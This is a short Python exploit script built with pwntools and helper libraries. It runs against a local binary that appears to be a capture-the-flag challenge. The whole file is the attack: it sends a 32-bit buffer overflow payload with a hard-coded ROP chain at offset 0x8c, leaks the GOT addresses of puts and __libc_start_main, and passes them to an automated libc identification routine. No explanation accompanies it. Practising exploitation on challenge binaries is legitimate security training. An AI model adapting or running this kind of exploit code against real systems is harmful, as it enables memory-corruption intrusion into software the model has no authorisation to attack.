from pwn import *

import sf

import thenight

import sys

target = process("./chall-test_LocalLibcId-encrypt19-pwn3")
bof_payload = sf.BufferOverflow(arch=32)

bof_payload.set_input_start(0x8c)
rop_chain = [134513472, 134513472, 134518704, 134518712]
bof_payload.add_rop_chain(rop_chain)
payload = bof_payload.generate_payload()
target.sendline(payload)
target.recvline()
target.recvline()
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
thenight.find_libc_version_automated("puts", gotAddress0, "__libc_start_main", gotAddress1)
